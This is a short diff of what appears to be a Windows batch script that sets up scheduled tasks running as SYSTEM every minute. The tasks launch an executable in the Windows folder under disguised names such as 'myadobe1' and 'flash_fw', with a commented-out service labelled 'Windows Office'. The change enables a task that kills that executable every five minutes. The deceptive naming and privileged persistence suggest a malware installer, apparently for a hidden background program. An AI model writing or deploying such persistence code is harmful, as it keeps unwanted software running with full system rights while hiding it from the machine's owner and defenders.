@@ -10,4 +10,4 @@ rem sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" star
 rem net start wup
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
-rem schtasks /create /ru "SYSTEM" /sc minute /mo 3 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
+schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
